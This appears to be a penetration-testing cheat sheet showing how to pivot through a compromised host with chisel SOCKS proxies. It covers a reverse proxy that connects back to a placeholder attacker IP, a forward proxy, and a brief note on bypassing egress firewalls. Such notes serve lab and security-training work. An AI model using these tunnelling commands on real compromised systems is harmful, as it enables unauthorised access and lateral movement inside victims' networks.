## Reverse SOCKS Proxy

This connects back from a compromised box to a listener waiting on our attacking box

On the attack box set up a listener:
`./chisel server -p LISTEN_PORT --reverse &`

On the compromised box:
`./chisel client ATTACKING_IP:LISTEN_PORT R:socks &`
This command connects back to listener on attack box, completing proxy

---

## Forward SOCKS Proxy

This is used rarely because reverse shells are more common than bind shells. Egress firewalls (handling outbound traffic) are easier to bypass than ingress firewalls (inbound connections).

On compromised box:
`./chisel server -p LISTEN_PORT --socks5`

On attacking box:
`./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`

`PROXY_PORT` is the port that will be opened for the proxy




